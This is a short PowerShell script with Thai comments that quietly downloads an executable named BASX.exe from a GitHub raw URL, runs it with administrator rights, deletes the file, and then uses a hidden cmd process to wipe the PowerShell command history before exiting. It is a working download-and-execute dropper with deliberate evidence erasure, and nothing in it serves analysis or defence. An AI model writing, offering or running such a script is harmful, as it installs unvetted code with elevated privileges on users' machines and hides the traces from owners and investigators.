# 1. ตั้งค่าเบื้องหลัง
$url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"
$output = "$env:TEMP\BASX.exe"
$historyPath = (Get-PSReadlineOption).HistorySavePath

# 2. ดาวน์โหลดไฟล์แบบเงียบๆ
$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest -Uri $url -OutFile $output

# 3. สั่งรันแบบ Admin และรอจนกว่าโปรแกรมจะปิด
Start-Process -FilePath $output -Verb RunAs -Wait

# 4. พอดับปุ๊บ สั่งลบไฟล์ EXE ทันที
if (Test-Path $output) {
    Remove-Item -Path $output -Force -ErrorAction SilentlyContinue
}

# 5. เทคนิคพิเศษ: สั่งให้ CMD รอ 2 วินาที (เพื่อให้ PowerShell ปิดตัวลงก่อน) แล้วค่อยตามไปลบไฟล์ประวัติ
# วิธีนี้จะทำให้ไม่ติด Error ตัวแดงเพราะไฟล์ถูกใช้งานอยู่
$cleanupHistory = "timeout /t 2 && del /f /q `"$historyPath`""
Start-Process cmd -ArgumentList "/c $cleanupHistory" -WindowStyle Hidden

# 6. ปิด PowerShell ทันที
exit
